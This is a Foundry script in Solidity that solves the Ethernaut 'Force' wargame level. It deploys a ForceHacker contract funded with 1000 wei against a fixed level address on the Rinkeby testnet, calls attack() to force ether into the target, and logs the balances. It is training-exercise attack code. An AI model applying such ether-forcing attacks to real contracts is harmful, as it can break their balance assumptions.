// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Ethernaut/Force/ForceHacker.sol";
import "forge-std/console.sol";

//Execute
//forge script script/Force.s.sol:ForceScript --rpc-url $RINKEBY_RPC_URL --broadcast --private-key $PRIVATE_KEY --verify --etherscan-api-key $ETHERSCAN_KEY
   
contract ForceScript is Script {
    function setUp() public {}

    function run() public {

        console.log(msg.sender);
        console.log("####1");
        vm.startBroadcast();
        console.log(msg.sender);

        console.log("####2");
        ForceHacker force = new ForceHacker{value: 1000 wei}(0x087e02477E45067F8C5428f2550Ae6A988E4848D);
        console.log(address(this));
        console.log(force.owner());
        
        console.log("####3");
        console.log(address(0x087e02477E45067F8C5428f2550Ae6A988E4848D).balance);
        force.attack();
        console.log(address(0x087e02477E45067F8C5428f2550Ae6A988E4848D).balance);
        
        console.log("####4");
        vm.stopBroadcast();
        
        console.log("####5");

    }
}
